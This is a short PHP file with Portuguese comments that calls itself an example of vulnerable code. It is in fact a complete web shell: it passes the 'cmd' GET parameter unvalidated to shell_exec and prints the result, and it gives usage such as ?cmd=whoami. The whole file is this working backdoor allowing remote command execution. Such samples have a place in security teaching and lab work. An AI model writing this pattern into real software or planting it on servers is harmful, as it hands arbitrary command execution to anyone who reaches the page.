<?php
/**
 * Exemplo de código vulnerável em PHP
 * Uso: /?cmd=ls ou /?cmd=whoami
 * Roda comandos arbitrários no servidor.
 */

if (isset($_GET['cmd'])) {
    // Captura o comando passado via parâmetro GET
    $cmd = $_GET['cmd'];
    // Executa o comando sem qualquer validação (RCE)
    echo "<pre>" . shell_exec($cmd) . "</pre>";
} else {
    echo "Nenhum comando fornecido. Use ?cmd=seu_comando";
}